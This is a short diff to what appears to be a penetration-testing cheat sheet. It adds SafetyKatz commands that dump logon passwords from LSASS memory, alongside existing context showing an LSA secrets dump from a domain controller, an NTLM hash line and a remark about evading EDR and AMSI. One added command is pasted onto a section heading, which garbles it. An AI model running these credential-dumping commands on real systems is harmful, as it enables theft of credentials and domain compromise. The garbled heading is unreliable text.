@@ -1469,7 +1469,7 @@ DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c0
 ```
 
 [[file]]
-== File Transfering
+== File Transferingsafetykatz.exe "privilege::debug" "sekurlsa::evasive-logonpasswords" "exit" 
 
 If EDR and AMSI catches us we can try to load PowerShell script in *MEMORY*
 
@@ -1729,6 +1729,10 @@ All credentials from the domain extracted from DC
 
 ```bash
 SafetyKatz.exe -args "lsadump::evasive-lsa /patch" "exit"
+```
+
+```bash
+safetykatz.exe "privilege::debug" "sekurlsa::evasive-logonpasswords" "exit" 
 ```
 
 
